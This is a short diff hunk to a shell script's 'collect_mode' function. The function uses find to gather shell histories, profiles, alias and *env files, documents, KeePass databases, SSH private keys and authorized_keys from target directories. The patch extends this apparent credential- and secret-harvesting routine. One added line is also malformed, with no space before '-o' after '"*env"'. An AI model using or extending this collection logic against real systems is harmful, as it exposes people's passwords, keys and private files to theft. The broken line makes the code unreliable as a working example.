@@ -172,10 +172,12 @@ collect_mode() {
         find "$DIR" -type f \
             \( -name ".bash_history" -o -name ".zsh_history" \
             -o -name ".bashrc" -o -name ".zshrc" \
+            -o -name ".bash_profile" -o -name ".zprofile" -o -name ".profile" \
+            -o -name ".bash_aliases" -o -name ".zsh_aliases" \
             -o -name "*.txt" -o -name "*.log" -o -name "*.conf" \
             -o -name "*.pdf" -o -name "*.xls" -o -name "*.xlsx" \
             -o -name "*.doc" -o -name "*.docx" -o -name "*.kdbx" \
-            -o -name "id_*" -o -name "authorized_keys" \) \
+            -o -name "id_*" -o -name "*env"-o -name "authorized_keys" \) \
             -print0 2>/dev/null || true
     done |
         while IFS= read -r -d '' f; do
